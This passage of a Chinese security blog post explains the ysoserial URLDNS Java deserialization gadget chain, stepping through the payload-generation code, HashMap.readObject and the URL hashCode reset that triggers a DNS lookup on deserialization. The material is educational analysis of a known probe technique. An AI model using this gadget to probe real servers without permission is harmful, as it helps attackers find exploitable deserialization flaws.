<span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>URLDNS.java</code>中有<code>main</code>函数，这是为了方便对其单独调试。我们可以运行主函数，查看其如何产生相应的payload。</p>
<p>跟进<code>PayloadRunner.run()</code>;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// ensure payload generation doesn&#x27;t throw an exception</span></span><br><span class="line">    <span class="type">byte</span>[] serialized = <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;<span class="type">byte</span>[]&gt;()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="literal">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">            Utils.releasePayload(payload, objBefore);</span><br><span class="line">            <span class="keyword">return</span> ser;</span><br><span class="line">    &#125;&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objAfter</span> <span class="operator">=</span> Deserializer.deserialize(serialized);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>run</code>方法首先获取了序列化之后的数据<code>serialized</code>，之后又将其反序列化。</p>
<p>由于我们是直接运行的<code>main</code>方法，因此<code>command</code>的值是从<code>getDefaultTestCmd()</code>获取的。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210945339.png"
                      alt="image-20230626210945339"
                ></p>
<p>可以看到其返回的为<code>calc.exe</code>，但前面提到<code>URLDNS</code>仅仅能发起DNS请求，无法命令执行。因此这里需要稍作更改，更改为DNS地址。例如：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210959944.png"
                      alt="image-20230626210959944"
                ></p>
<p>回到<code>run</code>方法，获取到参数之后，程序会将<code>URLDNS</code>类实例化，并调用<code>getObject()</code>方法。</p>
<p>看一下<code>URLDNS.getObject()</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>首先创建<code>URLStreamHandler</code>，前面提到了：<code>hashcode</code>和<code>equals</code>实际上都是调用了<code>URLStreamHandler</code>里的方法。这里的<code>handler</code>是特地自定义的继承<code>URLStreamHandler</code>的类。具体为什么这么做，后面分析。</p>
<p>之后创建<code>HashMap</code>和<code>URL</code>，并调用<code>HashMap.put</code>。跟一下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211026218.png"
                      alt="image-20230626211026218"
                ></p>
<p>可以看到里面有<code>hash(key)</code>，其会变成<code>key.hashcode</code>。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211049531.png"
                      alt="image-20230626211049531"
                ></p>
<p>而这里的<code>key</code>往上追溯的话会发现就是根据<code>command</code>创建的<code>URL</code>。这里对应上了<code>URLDNS成因</code>里的<code>hashcode</code>，意味着在这里会发生一次DNS请求。</p>
<p>回到<code>getObject()</code>，<code>HashMap.put</code>完之后将<code>URL</code>的<code>hashcode</code>置为-1，具体原因后面说。最后返回<code>HashMap</code>。</p>
<p>回到<code>PayloadRunner.run()</code>，返回的<code>HashMap</code>会被序列化。</p>
<p>接下来看反序列化部分。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">           <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">objAfter</span> <span class="operator">=</span> Deserializer.deserialize(serialized);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>前面我们提到，反序列化时会调用对象的<code>readObject</code>方法。去看一下<code>HashMap.readObject()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到最后一行存在<code>hash(key)</code>操作，这里的<code>key</code>是从<code>HashMap</code>中取出来的，也就是<code>URL</code>。后面当然也同样对应上了<code>URLDNS成因</code>里的<code>hashcode</code>，意味着在这里也会发生一次DNS请求。</p>
<p>但是经过尝试我们会发现，在整个序列化和反序列化的过程中，仅仅发生了一次DNS请求。这里就和前面特地用继承<code>URLStreamHandler</code>的类有关了。</p>
<p>序列化时用到的<code>URLStreamHandler</code>类为<code>SilentURLStreamHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>当序列化时，会调用<code>URL.hashcode()</code>，从而调用<code>URLStreamHandler.hashcode()</code>，然后调用<code>URLStreamHandler.getHostAddress()</code>，这里被替换成了<code>SilentURLStreamHandler.getHostAddress()</code>自然不会继续往下发起DNS请求，但这不是必须的，即使发生两次DNS请求，也可以确认存在反序列化（本地测试时发现，使用<code>URLStreamHandler</code>同样也是只有一次DNS请求，经过debug发现由于序列化和反序列化在同一环境下，反序列化时直接从cache中获的address，并未真正的发起DNS请求）。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211119971.png"
                      alt="image-20230626211119971"
                ></p>
<p>这里有个需要注意的点：<code>SilentURLStreamHandler</code>是我们自定义的类，在反序列化的时候系统中是没有这个类的，那么他是如何成功反序列化的？并且反序列化时如果调用<code>SilentURLStreamHandler</code>，那岂不是也没有DNS请求？</p>
<p>关于这两个问题：在<code>URL</code>类中<code>URLStreamHandler</code>是被transient修饰的，其并不参与序列化。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211131523.png"
                      alt="image-20230626211131523"
                ></p>
<p>当反序列化时，会重新创建<code>URLStreamHandler</code>类，以便正常使用其功能。</p>
<p>最后一个问题，序列化时为什么<code>HashMap.put</code>完之后将<code>URL</code>的<code>hashcode</code>置为-1。</p>
<p>这个就要看一下<code>URL.hashcode</code>了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211155675.png"
                      alt="image-20230626211155675"
                ></p>
<p>由于我们在序列化时已经进行过<code>hashcode</code>了，只有将其置为1，在反序列化时其才会再次触发。</p>
<p>​	<img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626211304848.png"
                      alt="image-20230626211304848"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
</search>
